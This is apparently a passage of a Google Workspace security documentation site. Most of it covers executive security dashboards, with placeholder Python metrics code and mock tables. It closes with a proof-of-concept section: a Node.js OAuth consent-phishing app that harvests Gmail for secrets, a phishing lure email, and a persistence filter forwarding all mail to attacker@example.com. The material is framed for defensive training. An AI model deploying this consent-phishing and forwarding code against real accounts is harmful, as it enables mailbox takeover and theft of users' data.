</ol> <p>Service Compliance Matrix Example:</p> Service Security Score Critical Controls Trend Status Gmail 92/100 100% (15/15) \u2191 3% \u2705 Drive 78/100 93% (14/15) \u2193 2% \u26a0\ufe0f Identity 95/100 100% (12/12) \u2191 5% \u2705 Meet 85/100 100% (10/10) \u2194 0% \u2705 Groups 72/100 89% (8/9) \u2191 12% \u26a0\ufe0f Calendar 88/100 100% (8/8) \u2191 2% \u2705 <ol> <li>Critical Risk Summary</li> <li>Count of critical security issues</li> <li>Remediation status metrics</li> <li>Time-to-remediate trends</li> <li>Top risk categories</li> </ol> <pre><code># Python function to generate critical risk summary data\ndef generate_critical_risk_summary(admin_sdk_service, reports_service):\n    \"\"\"Generate data for critical risk summary component\"\"\"\n    # Time ranges for comparison\n    current_period_start = (datetime.now() - timedelta(days=30)).strftime('%Y-%m-%d')\n    previous_period_start = (datetime.now() - timedelta(days=60)).strftime('%Y-%m-%d')\n    previous_period_end = (datetime.now() - timedelta(days=30)).strftime('%Y-%m-%d')\n    \n    # Get current critical issues\n    current_critical_issues = get_critical_security_issues(\n        admin_sdk_service, \n        reports_service,\n        start_date=current_period_start\n    )\n    \n    # Get previous period issues for comparison\n    previous_critical_issues = get_critical_security_issues(\n        admin_sdk_service, \n        reports_service,\n        start_date=previous_period_start,\n        end_date=previous_period_end\n    )\n    \n    # Calculate metrics\n    current_count = len(current_critical_issues)\n    previous_count = len(previous_critical_issues)\n    count_trend = calculate_percentage_change(previous_count, current_count)\n    \n    # Calculate remediation metrics\n    remediated_issues = [i for i in current_critical_issues if i['status'] == 'remediated']\n    remediation_percentage = (len(remediated_issues) / max(current_count, 1)) * 100\n    \n    # Calculate average time to remediate\n    remediation_times = [i['remediation_time_days'] for i in remediated_issues if 'remediation_time_days' in i]\n    avg_remediation_time = sum(remediation_times) / max(len(remediation_times), 1)\n    \n    # Get top risk categories\n    risk_categories = {}\n    for issue in current_critical_issues:\n        category = issue.get('category', 'Uncategorized')\n        if category not in risk_categories:\n            risk_categories[category] = 0\n        risk_categories[category] += 1\n        \n    top_categories = sorted(\n        [{'category': k, 'count': v} for k, v in risk_categories.items()],\n        key=lambda x: x['count'],\n        reverse=True\n    )[:5]  # Top 5 categories\n    \n    return {\n        'current_count': current_count,\n        'previous_count': previous_count,\n        'count_trend': count_trend,\n        'remediation_percentage': remediation_percentage,\n        'avg_remediation_time': avg_remediation_time,\n        'top_categories': top_categories,\n        'unremediated_count': current_count - len(remediated_issues)\n    }\n\ndef get_critical_security_issues(admin_sdk_service, reports_service, start_date, end_date=None):\n    \"\"\"Get critical security issues from various sources\"\"\"\n    # This would aggregate data from multiple sources:\n    # 1. Admin alerts from admin_sdk_service\n    # 2. Security audit findings\n    # 3. DLP violations\n    # 4. Authentication alerts\n    # 5. Custom security rules\n    \n    # Implementation depends on your specific monitoring setup\n    # This is a simplified placeholder\n    return [\n        {\n            'id': 'CRIT-001',\n            'title': 'External sharing of sensitive data',\n            'category': 'Data Exposure',\n            'status': 'active',\n            'detected_date': '2023-05-15',\n            'severity': 'critical'\n        },\n        # Additional issues would be included here\n    ]\n</code></pre> <ol> <li>Regulatory Compliance Status</li> <li>Compliance scores by framework</li> <li>Failed control count</li> <li>Remediation progress indicators</li> <li>Audit readiness status</li> </ol> <p>Compliance Status Example:</p> Framework Compliance Controls Gap Count Trend ISO 27001 92% 115/125 10 \u2191 3% NIST CSF 88% 93/106 13 \u2191 5% HIPAA 95% 57/60 3 \u2191 2% SOC 2 91% 83/91 8 \u2194 0% GDPR 89% 72/81 9 \u2191 4%"},{"location":"executive-dashboards/#2-threat-and-incident-dashboard","title":"2. Threat and Incident Dashboard","text":"<p>This dashboard focuses on security incidents, threat detection, and response metrics.</p>"},{"location":"executive-dashboards/#key-components_1","title":"Key Components","text":"<ol> <li>Incident Summary</li> <li>Total incidents by severity</li> <li>Mean time to detect (MTTD)</li> <li>Mean time to respond (MTTR)</li> <li>Mean time to remediate (MTTR)</li> <li>Incident status breakdown</li> </ol> <p>Incident Summary Visualization:</p> <pre><code>\u250c\u2500 Incident Summary (Last 30 Days) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                            \u2502\n\u2502  Critical: 3 (+1)   High: 12 (-2)          \u2502\n\u2502  Medium: 27 (-5)    Low: 41 (-8)           \u2502\n\u2502                                            \u2502\n\u2502  MTTD: 2.3 hours (\u2193 15%)                   \u2502\n\u2502  MTTR: 3.8 hours (\u2193 12%)                   \u2502\n\u2502  TTR: 3.2 days (\u2193 8%)                      \u2502\n\u2502                                            \u2502\n\u2502  Open: 8   In Progress: 5   Resolved: 70   \u2502\n\u2502                                            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ol> <li>Threat Intelligence Overview</li> <li>Active threat campaigns</li> <li>Workspace-specific threat indicators</li> <li>Blocked attack attempts</li> <li>User security awareness status</li> </ol> <pre><code># Python function to generate threat intelligence summary\ndef generate_threat_intelligence_summary(reports_service):\n    \"\"\"Generate threat intelligence summary data\"\"\"\n    # Time range for analysis\n    start_date = (datetime.now() - timedelta(days=30)).strftime('%Y-%m-%d')\n    \n    # Get security events\n    security_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='login,token,admin,mobile',\n        startTime=start_date,\n        maxResults=1000\n    ).execute()\n    \n    # Analyze phishing attempts\n    phishing_attempts = count_phishing_attempts(reports_service, start_date)\n    \n    # Analyze login blocks\n    login_blocks = count_login_blocks(reports_service, start_date)\n    \n    # Count malware detected\n    malware_detected = count_malware_detected(reports_service, start_date)\n    \n    # Count data exfiltration attempts\n    exfiltration_attempts = count_exfiltration_attempts(reports_service, start_date)\n    \n    # Get awareness training status\n    awareness_stats = get_awareness_training_stats(start_date)\n    \n    return {\n        'phishing_attempts': phishing_attempts,\n        'login_blocks': login_blocks,\n        'malware_detected': malware_detected,\n        'exfiltration_attempts': exfiltration_attempts,\n        'awareness_stats': awareness_stats\n    }\n\n# Helper functions would implement the specific counting logic\n# These are simplified placeholders\ndef count_phishing_attempts(reports_service, start_date):\n    \"\"\"Count phishing attempts\"\"\"\n    return {'count': 245, 'trend': -12}\n    \ndef count_login_blocks(reports_service, start_date):\n    \"\"\"Count blocked login attempts\"\"\"\n    return {'count': 1872, 'trend': 8}\n    \ndef count_malware_detected(reports_service, start_date):\n    \"\"\"Count malware detected in email and Drive\"\"\"\n    return {'count': 87, 'trend': -5}\n    \ndef count_exfiltration_attempts(reports_service, start_date):\n    \"\"\"Count potential data exfiltration attempts\"\"\"\n    return {'count': 23, 'trend': -15}\n    \ndef get_awareness_training_stats(start_date):\n    \"\"\"Get security awareness training stats\"\"\"\n    return {\n        'completion_rate': 92,\n        'phish_test_failure_rate': 8,\n        'trend': -3\n    }\n</code></pre> <ol> <li>Account Security Status</li> <li>MFA adoption metrics</li> <li>Account compromise attempts</li> <li>Password health statistics</li> <li>Account security policy compliance</li> </ol> <p>Account Security Visualization:</p> <pre><code>\u250c\u2500 Account Security Status \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                             \u2502\n\u2502  MFA Adoption: 97% (+2%)                    \u2502\n\u2502  Hardware Key Usage: 85% (+5%)              \u2502\n\u2502                                             \u2502\n\u2502  Account Compromise Attempts: 37 (-12%)     \u2502\n\u2502  Successful Compromises: 0 (0%)             \u2502\n\u2502                                             \u2502\n\u2502  Password Policy Compliance: 100%           \u2502\n\u2502  Advanced Protection Enrollment: 100%       \u2502\n\u2502                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ol> <li>Data Protection Metrics</li> <li>DLP violation trends</li> <li>Sensitive data exposure incidents</li> <li>External sharing statistics</li> <li>Data access anomalies</li> </ol> <p>Data Protection Matrix Example:</p> Category Count Trend Auto-Remediated Risk Level PII Exposure 17 \u2193 35% 15 (88%) Medium Financial Data 4 \u2193 50% 4 (100%) Low Source Code 8 \u2193 20% 7 (88%) Medium Customer Data 3 \u2193 70% 3 (100%) Low Employee Data 5 \u2193 45% 5 (100%) Low"},{"location":"executive-dashboards/#3-risk-management-dashboard","title":"3. Risk Management Dashboard","text":"<p>This dashboard provides strategic risk overview and remediation status.</p>"},{"location":"executive-dashboards/#key-components_2","title":"Key Components","text":"<ol> <li>Risk Posture Overview</li> <li>Enterprise risk score</li> <li>Risk breakdown by category</li> <li>Highest risk areas</li> <li>Risk trend over time</li> </ol> <pre><code>Implementation strategy:\n- Aggregate risks from all Workspace services\n- Calculate composite risk score based on:\n  * Control implementation\n  * Threat intelligence\n  * Vulnerability status\n  * User behavior\n- Weight risks by potential business impact\n- Update weekly with trend analysis\n</code></pre> <ol> <li>Top Security Gaps</li> <li>Critical control failures</li> <li>Highest impact vulnerabilities</li> <li>Remediation status</li> <li>Business impact assessment</li> </ol> <p>Top Gaps Example Table:</p> Gap Service Impact Status Age (days) External sharing controls Drive Critical In Progress 7 Admin 2FA enforcement Identity Critical Planning 12 DLP policy exceptions Gmail High In Progress 15 OAuth app restrictions API Controls High Completed 0 Group access controls Groups Medium In Progress 4 <ol> <li>Security Investment ROI</li> <li>Security spending effectiveness</li> <li>Cost per incident</li> <li>Risk reduction per dollar</li> <li>Comparative security program efficiency</li> </ol> <pre><code># Python function to calculate security ROI metrics\ndef calculate_security_roi_metrics(current_month, baseline_month):\n    \"\"\"Calculate security ROI metrics for dashboard\"\"\"\n    # This would require integrating cost data with security metrics\n    # Simplified example with placeholder data\n    \n    security_investment = {\n        'baseline': 100000,  # Baseline monthly security spend\n        'current': 125000,   # Current monthly security spend\n        'increase_percentage': 25\n    }\n    \n    # Incident metrics\n    incident_metrics = {\n        'baseline_count': 35,           # Baseline month incident count\n        'current_count': 22,            # Current month incident count\n        'reduction_percentage': 37.1,   # Percent reduction\n        'baseline_cost': 175000,        # Estimated baseline incident cost\n        'current_cost': 85000,          # Estimated current incident cost\n        'cost_reduction': 90000         # Cost reduction\n    }\n    \n    # Calculate ROI\n    roi = {\n        'additional_investment': security_investment['current'] - security_investment['baseline'],\n        'cost_savings': incident_metrics['baseline_cost'] - incident_metrics['current_cost'],\n        'roi_percentage': ((incident_metrics['baseline_cost'] - incident_metrics['current_cost']) / \n                          (security_investment['current'] - security_investment['baseline'])) * 100,\n        'risk_reduction_per_dollar': incident_metrics['reduction_percentage'] / security_investment['increase_percentage']\n    }\n    \n    return {\n        'security_investment': security_investment,\n        'incident_metrics': incident_metrics,\n        'roi': roi\n    }\n</code></pre> <ol> <li>Regulatory Risk Exposure</li> <li>Compliance gap analysis</li> <li>Potential regulatory penalties</li> <li>Documentation completeness</li> <li>Audit readiness status</li> </ol> <p>Regulatory Risk Visualization:</p> <pre><code>\u250c\u2500 Regulatory Risk Exposure \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                            \u2502\n\u2502  Overall Compliance: 93% (+2%)             \u2502\n\u2502  Estimated Risk Exposure: $375K (-$125K)   \u2502\n\u2502                                            \u2502\n\u2502  Gap Analysis:                             \u2502\n\u2502  \u251c\u2500 GDPR: 4 gaps ($200K exposure)          \u2502\n\u2502  \u251c\u2500 HIPAA: 2 gaps ($100K exposure)         \u2502\n\u2502  \u251c\u2500 SOC 2: 3 gaps ($50K exposure)          \u2502\n\u2502  \u2514\u2500 ISO 27001: 2 gaps ($25K exposure)      \u2502\n\u2502                                            \u2502\n\u2502  Audit Readiness: 95% (+5%)                \u2502\n\u2502                                            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"executive-dashboards/#4-security-operations-dashboard","title":"4. Security Operations Dashboard","text":"<p>This dashboard focuses on operational security metrics and team performance.</p>"},{"location":"executive-dashboards/#key-components_3","title":"Key Components","text":"<ol> <li>Security Control Efficacy</li> <li>Control implementation rates</li> <li>Control effectiveness ratings</li> <li>Failed control attempts</li> <li>Control coverage metrics</li> </ol> <p>Control Efficacy Matrix Example:</p> Control Category Implementation Effectiveness Coverage Trend Authentication 98% 97% 100% \u2191 2% Data Protection 92% 88% 95% \u2191 5% Threat Detection 95% 93% 100% \u2194 0% Admin Security 100% 98% 100% \u2191 1% Device Security 87% 85% 93% \u2191 8% <ol> <li>Security Team Performance</li> <li>Alert handling metrics</li> <li>Incident response times</li> <li>Backlog status</li> <li>Team capacity indicators</li> </ol> <pre><code># Python function to calculate security team metrics\ndef calculate_security_team_metrics(reports_service, start_date):\n    \"\"\"Calculate security team performance metrics\"\"\"\n    # This would integrate with your security operations platform\n    # Simplified example with placeholder calculations\n    \n    # Alert metrics\n    alert_metrics = {\n        'total_alerts': 1245,\n        'alerts_per_day': 41.5,\n        'alert_trend': -8,  # percentage change\n        'alerts_by_severity': {\n            'critical': 37,\n            'high': 186,\n            'medium': 422,\n            'low': 600\n        },\n        'false_positive_rate': 12  # percentage\n    }\n    \n    # Response metrics\n    response_metrics = {\n        'average_triage_time_minutes': 12,\n        'average_response_time_hours': 2.3,\n        'average_resolution_time_hours': 8.7,\n        'sla_compliance_percentage': 97\n    }\n    \n    # Backlog metrics\n    backlog_metrics = {\n        'total_open_items': 23,\n        'backlog_trend': -15,  # percentage change\n        'average_age_days': 3.2,\n        'items_overdue': 2\n    }\n    \n    # Team capacity\n    capacity_metrics = {\n        'team_utilization_percentage': 85,\n        'available_capacity_hours': 45,\n        'utilization_trend': 5  # percentage change\n    }\n    \n    return {\n        'alert_metrics': alert_metrics,\n        'response_metrics': response_metrics,\n        'backlog_metrics': backlog_metrics,\n        'capacity_metrics': capacity_metrics\n    }\n</code></pre> <ol> <li>Automation Effectiveness</li> <li>Automated response rate</li> <li>Automation failure rate</li> <li>Time saved through automation</li> <li>Automation coverage metrics</li> </ol> <p>Automation Effectiveness Display:</p> <pre><code>\u250c\u2500 Security Automation Metrics \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                                            \u2502\n\u2502  Automated Response Rate: 78% (+8%)        \u2502\n\u2502  Manual Investigation Rate: 22% (-8%)      \u2502\n\u2502                                            \u2502\n\u2502  Automation Success Rate: 97% (+2%)        \u2502\n\u2502  Estimated Time Saved: 187 hours           \u2502\n\u2502                                            \u2502\n\u2502  Top Automated Workflows:                  \u2502\n\u2502  1. Phishing Response (412 incidents)      \u2502\n\u2502  2. Access Anomalies (253 incidents)       \u2502\n\u2502  3. DLP Remediation (201 incidents)        \u2502\n\u2502                                            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ol> <li>Vulnerability Management Status</li> <li>Open vulnerability trends</li> <li>Time-to-patch metrics</li> <li>Vulnerability risk exposure</li> <li>Patch compliance status</li> </ol> <p>Vulnerability Management Table Example:</p> Category Open Count Avg Age (days) SLA Compliance Trend Critical 0 0 100% \u2194 0% High 3 4.2 100% \u2193 40% Medium 12 12.5 92% \u2193 25% Low 27 23.8 85% \u2193 10%"},{"location":"executive-dashboards/#implementation-strategies","title":"Implementation Strategies","text":""},{"location":"executive-dashboards/#1-data-collection-and-integration","title":"1. Data Collection and Integration","text":"<p>Implement comprehensive data collection to power executive dashboards:</p> <ol> <li> <p>Google Workspace API Integration <pre><code># Python example for Workspace API integration\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\ndef initialize_workspace_services():\n    \"\"\"Initialize Google Workspace API services\"\"\"\n    # Define the scopes required for API access\n    SCOPES = [\n        'https://www.googleapis.com/auth/admin.reports.audit.readonly',\n        'https://www.googleapis.com/auth/admin.reports.usage.readonly',\n        'https://www.googleapis.com/auth/admin.directory.user.readonly',\n        'https://www.googleapis.com/auth/admin.directory.domain.readonly',\n        'https://www.googleapis.com/auth/admin.directory.group.readonly',\n        'https://www.googleapis.com/auth/apps.alerts'\n    ]\n    \n    # Service account credentials from JSON key file\n    credentials = ServiceAccountCredentials.from_json_keyfile_name(\n        'service-account-key.json', SCOPES)\n    \n    # Delegate to an admin user\n    delegated_credentials = credentials.create_delegated('admin@yourdomain.com')\n    \n    # Build services\n    services = {\n        'reports': build('admin', 'reports_v1', credentials=delegated_credentials),\n        'directory': build('admin', 'directory_v1', credentials=delegated_credentials),\n        'alerts': build('alertcenter', 'v1beta1', credentials=delegated_credentials)\n    }\n    \n    return services\n</code></pre></p> </li> <li> <p>Security Information Integration</p> </li> <li>Security information and event management (SIEM) integration</li> <li>Log aggregation and normalization</li> <li>Cross-platform security data correlation</li> <li> <p>Custom security metric calculation</p> </li> <li> <p>Metrics Definition and Collection</p> </li> <li>Define clear metric calculation methodologies</li> <li>Establish data quality controls</li> <li>Implement data validation procedures</li> <li>Create historical data storage and trending</li> </ol>"},{"location":"executive-dashboards/#2-dashboard-platform-options","title":"2. Dashboard Platform Options","text":"<p>Select appropriate platforms for dashboard implementation:</p> <ol> <li>Google Data Studio (Looker Studio)</li> <li>Native integration with Google services</li> <li>Rich visualization capabilities</li> <li>Interactive filtering and exploration</li> <li>Shareable and embeddable reports</li> </ol> <p>Implementation Notes: <pre><code>- Connect directly to Google Workspace audit logs\n- Create calculated fields for security metrics\n- Use date-range comparison for trend analysis\n- Implement parameter controls for interactive exploration\n- Schedule automatic refresh for near real-time data\n</code></pre></p> <ol> <li>Custom Dashboard Development</li> <li>Flexibility for specialized requirements</li> <li>Integration with existing security portals</li> <li>Custom business logic implementation</li> <li>Tailored visualization options</li> </ol> <p>Technology Stack Options:    - Frontend: React with D3.js or Chart.js    - Backend: Python (Flask/Django) or Node.js    - Data processing: Apache Airflow or custom ETL    - Storage: Google BigQuery or Cloud SQL</p> <ol> <li>Third-Party Security Platforms</li> <li>Pre-built Google Workspace integrations</li> <li>Specialized security visualization</li> <li>Cross-platform security correlation</li> <li>Compliance-focused reporting</li> </ol> <p>Integration Considerations:    - API access and authentication    - Data refresh frequency    - Custom field mapping    - Historical data availability</p>"},{"location":"executive-dashboards/#3-reporting-cadence-and-distribution","title":"3. Reporting Cadence and Distribution","text":"<p>Establish effective reporting workflows:</p> <ol> <li>Report Scheduling</li> <li>Weekly operational summaries</li> <li>Monthly executive briefings</li> <li>Quarterly board-level reviews</li> <li> <p>On-demand critical incident reporting</p> </li> <li> <p>Distribution Methods</p> </li> <li>Automated email delivery</li> <li>Secure dashboard access</li> <li>Interactive presentation materials</li> <li> <p>Executive briefing sessions</p> </li> <li> <p>Notification Thresholds</p> </li> <li>Define alert thresholds for key metrics</li> <li>Implement notification workflows</li> <li>Create escalation procedures</li> <li>Establish acknowledgment tracking</li> </ol>"},{"location":"executive-dashboards/#executive-presentation-strategies","title":"Executive Presentation Strategies","text":""},{"location":"executive-dashboards/#1-presentation-templates","title":"1. Presentation Templates","text":"<p>Develop standardized presentation materials:</p> <ol> <li> <p>Executive Summary Template <pre><code>1. Security Posture Overview (1 slide)\n   - Overall security score with trend\n   - Key risk indicators\n   - Significant changes since last report\n\n2. Critical Issues and Response (1-2 slides)\n   - High-priority security concerns\n   - Mitigation status and timeline\n   - Business impact assessment\n\n3. Security Program Progress (1 slide)\n   - Initiative status updates\n   - Key milestone achievements\n   - Resource utilization metrics\n\n4. Strategic Recommendations (1 slide)\n   - Prioritized security enhancements\n   - Resource requirements\n   - Expected business benefits\n</code></pre></p> </li> <li> <p>Board Presentation Template <pre><code>1. Security Risk Overview (1 slide)\n   - Enterprise security posture\n   - Risk trend analysis\n   - Peer comparison benchmarks\n\n2. Security Investment ROI (1 slide)\n   - Security spending effectiveness\n   - Risk reduction metrics\n   - Cost avoidance calculations\n\n3. Strategic Risk Areas (1 slide)\n   - Highest business impact risks\n   - Mitigation strategy overview\n   - Governance considerations\n\n4. Regulatory and Compliance Status (1 slide)\n   - Compliance posture by framework\n   - Audit readiness status\n   - Material findings and remediation\n</code></pre></p> </li> <li> <p>Security Committee Template <pre><code>1. Security Program Status (1-2 slides)\n   - Initiative progress against roadmap\n   - Resource allocation and utilization\n   - Key performance indicators\n\n2. Operational Metrics (2-3 slides)\n   - Incident response effectiveness\n   - Control performance data\n   - Vulnerability management metrics\n   - Threat landscape overview\n\n3. Risk Management (1-2 slides)\n   - Critical risk status\n   - Risk acceptance decisions\n   - Emerging risk areas\n\n4. Strategic Planning (1-2 slides)\n   - Future initiative proposals\n   - Technology evaluation results\n   - Capability enhancement recommendations\n</code></pre></p> </li> </ol>"},{"location":"executive-dashboards/#2-narrative-development","title":"2. Narrative Development","text":"<p>Create compelling security narratives for executives:</p> <ol> <li>Business Impact Focus</li> <li>Connect security metrics to business outcomes</li> <li>Quantify risk in financial terms when possible</li> <li>Relate security posture to business goals</li> <li> <p>Demonstrate ROI of security investments</p> </li> <li> <p>Simplified Technical Translation</p> </li> <li>Convert technical details to business language</li> <li>Use analogies for complex security concepts</li> <li>Provide context for technical terminology</li> <li> <p>Create executive-friendly security glossary</p> </li> <li> <p>Forward-Looking Analysis</p> </li> <li>Include predictive risk trending</li> <li>Anticipate evolving threat landscape</li> <li>Connect security strategy to business roadmap</li> <li>Provide proactive recommendations</li> </ol>"},{"location":"executive-dashboards/#dashboard-implementation-examples","title":"Dashboard Implementation Examples","text":""},{"location":"executive-dashboards/#1-google-workspace-security-posture-dashboard_1","title":"1. Google Workspace Security Posture Dashboard","text":"<p>Implementation Example in Google Looker Studio:</p> <ol> <li>Data Source Configuration</li> <li>Create BigQuery tables for processed security data</li> <li>Implement ETL for Google Workspace audit logs</li> <li>Establish calculated security metrics</li> <li> <p>Configure data refresh schedules</p> </li> <li> <p>Dashboard Structure</p> </li> <li>Overall security score card</li> <li>Service compliance heat map</li> <li>Critical control implementation status</li> <li>Historical trend charts</li> <li> <p>Compliance status by framework</p> </li> <li> <p>Interactivity Options</p> </li> <li>Date range selectors</li> <li>Service-specific filtering</li> <li>Drill-down capabilities for details</li> <li>Comparison period toggling</li> </ol>"},{"location":"executive-dashboards/#2-security-risk-trend-dashboard","title":"2. Security Risk Trend Dashboard","text":"<p>Implementation Example with Custom Development:</p> <ol> <li>Data Processing Pipeline</li> <li>Google Workspace audit log ingestion</li> <li>Security metrics calculation in Python</li> <li>Storage in time-series database</li> <li> <p>Automated risk scoring algorithms</p> </li> <li> <p>Visualization Components</p> </li> <li>Risk trend line charts with confidence intervals</li> <li>Categorical risk breakdown</li> <li>Risk factor correlation matrix</li> <li> <p>Predictive risk trajectory</p> </li> <li> <p>Interactive Features</p> </li> <li>Risk factor contribution analysis</li> <li>Scenario modeling capabilities</li> <li>Control effectiveness simulation</li> <li>Comparative benchmark overlay</li> </ol>"},{"location":"executive-dashboards/#continuous-improvement-framework","title":"Continuous Improvement Framework","text":""},{"location":"executive-dashboards/#1-dashboard-effectiveness-assessment","title":"1. Dashboard Effectiveness Assessment","text":"<p>Regularly evaluate and improve executive reporting:</p> <ol> <li>Executive Feedback Loops</li> <li>Structured feedback collection</li> <li>Usability evaluation sessions</li> <li>Comprehension testing</li> <li> <p>Decision support effectiveness measurement</p> </li> <li> <p>Metric Refinement Process</p> </li> <li>Periodic metric relevance review</li> <li>Calculation methodology validation</li> <li>Benchmark accuracy verification</li> <li> <p>New metric identification and development</p> </li> <li> <p>Visual Design Enhancement</p> </li> <li>Clarity and comprehension testing</li> <li>Information density optimization</li> <li>Accessibility improvements</li> <li>Mobile and large-display format optimization</li> </ol>"},{"location":"executive-dashboards/#2-analytics-maturity-evolution","title":"2. Analytics Maturity Evolution","text":"<p>Progress through increasing analytics sophistication:</p> <ol> <li>Descriptive Analytics (What happened?)</li> <li>Historical security events</li> <li>Control performance metrics</li> <li>Compliance status reporting</li> <li> <p>Incident summaries</p> </li> <li> <p>Diagnostic Analytics (Why did it happen?)</p> </li> <li>Root cause analysis</li> <li>Control failure investigation</li> <li>Correlation analysis</li> <li> <p>Comparative performance evaluation</p> </li> <li> <p>Predictive Analytics (What will happen?)</p> </li> <li>Risk trajectory forecasting</li> <li>Threat trend prediction</li> <li>Security posture projection</li> <li> <p>Vulnerability exploitation likelihood</p> </li> <li> <p>Prescriptive Analytics (What should we do?)</p> </li> <li>Optimal control recommendations</li> <li>Resource allocation optimization</li> <li>Risk mitigation prioritization</li> <li>Security architecture improvement guidance</li> </ol>"},{"location":"executive-dashboards/#resources-and-references","title":"Resources and References","text":"<ol> <li>Google Workspace Reporting Tools</li> <li>Google Workspace Admin Console Reports</li> <li>Google Workspace Audit API</li> <li> <p>Looker Studio (formerly Data Studio)</p> </li> <li> <p>Security Metrics Guidance</p> </li> <li>CIS Security Metrics Guide</li> <li>NIST SP 800-55: Performance Measurement Guide</li> <li> <p>OWASP Security Metrics Project</p> </li> <li> <p>Executive Communication Resources</p> </li> <li>SANS: Communicating Security to the Board</li> <li>Gartner: Security Metrics That Matter to the Board</li> <li>FAIR Institute: Risk Quantification</li> </ol> <p>Note: This guide should be adapted to your organization's specific Google Workspace configuration, security posture, and executive reporting requirements.</p>"},{"location":"exploitation-examples/","title":"Exploitation Examples","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"exploitation-examples/#google-workspace-exploitation-examples-and-fixes","title":"Google Workspace Exploitation Examples and Fixes","text":"<p>This document provides security professionals with practical examples of Google Workspace security vulnerabilities, proof-of-concept exploitation techniques, and corresponding remediation strategies. This knowledge enables effective threat hunting, vulnerability assessment, and security hardening.</p> <p>IMPORTANT: These techniques are provided exclusively for defensive purposes. All examples should only be used in authorized testing environments with proper permissions. Never attempt these techniques against production systems without explicit written authorization.</p>"},{"location":"exploitation-examples/#1-oauth-token-manipulation-attacks","title":"1. OAuth Token Manipulation Attacks","text":""},{"location":"exploitation-examples/#vulnerability-excessive-oauth-scope-authorization","title":"Vulnerability: Excessive OAuth Scope Authorization","text":"<p>Description: Users are often unaware of the permissions they grant to third-party applications, frequently authorizing excessive scopes that can be exploited.</p>"},{"location":"exploitation-examples/#proof-of-concept-exploitation","title":"Proof-of-Concept Exploitation:","text":"<p>1. Creating a Deceptive OAuth Application:</p> <pre><code>// Simple Node.js example of a malicious OAuth app\nconst express = require('express');\nconst { google } = require('googleapis');\nconst app = express();\n\n// OAuth configuration\nconst oauth2Client = new google.auth.OAuth2(\n  'YOUR_CLIENT_ID',\n  'YOUR_CLIENT_SECRET',\n  'http://localhost:3000/auth/google/callback'\n);\n\n// Request excessive scopes\nconst scopes = [\n  'https://www.googleapis.com/auth/gmail.readonly',\n  'https://www.googleapis.com/auth/drive',\n  'https://www.googleapis.com/auth/calendar'\n];\n\napp.get('/auth', (req, res) =&gt; {\n  // Create deceptive authorization URL\n  const authUrl = oauth2Client.generateAuthUrl({\n    access_type: 'offline',\n    scope: scopes,\n    prompt: 'consent'\n  });\n  res.redirect(authUrl);\n});\n\napp.get('/auth/google/callback', async (req, res) =&gt; {\n  // Exchange code for tokens\n  const { tokens } = await oauth2Client.getToken(req.query.code);\n  oauth2Client.setCredentials(tokens);\n  \n  // At this point, the application has persistent access to user data\n  // Tokens could be stored for later use\n  \n  res.send('App connected successfully');\n  \n  // Behind the scenes, begin data exfiltration\n  extractSensitiveData(oauth2Client);\n});\n\nasync function extractSensitiveData(auth) {\n  // Example: Extract emails with sensitive content\n  const gmail = google.gmail({ version: 'v1', auth });\n  const response = await gmail.users.messages.list({\n    userId: 'me',\n    q: 'password OR credential OR confidential OR secret'\n  });\n  \n  // Process and exfiltrate data\n  // [...]\n}\n\napp.listen(3000, () =&gt; console.log('Server running on port 3000'));\n</code></pre> <p>2. Phishing Delivery:</p> <p>The attacker would create a convincing email or chat message:</p> <pre><code>Subject: Important Document Shared With You\n\nHi [Name],\n\nI've shared an important document regarding the upcoming project.\nPlease review it at your earliest convenience.\n\n[View Document]\n\nThanks,\n[Colleague Name]\n</code></pre> <p>The \"View Document\" link directs to the OAuth authorization flow, which appears legitimate but requests excessive permissions.</p> <p>3. Persistence Mechanism:</p> <pre><code>// Once tokens are acquired, establish persistence\nasync function establishPersistence(auth) {\n  // Create a mail forwarding filter to maintain access to communications\n  const gmail = google.gmail({ version: 'v1', auth });\n  \n  await gmail.users.settings.filters.create({\n    userId: 'me',\n    requestBody: {\n      criteria: {\n        from: '*', // All incoming emails\n      },\n      action: {\n        forward: 'attacker@example.com',\n        addLabelIds: ['INBOX']\n      }\n    }\n  });\n  \n  // Set up a Google Apps Script for persistent access\n  // [...]\n}\n</code></pre>"},{"location":"exploitation-examples/#remediation-strategies","title":"Remediation Strategies:","text":"<ol> 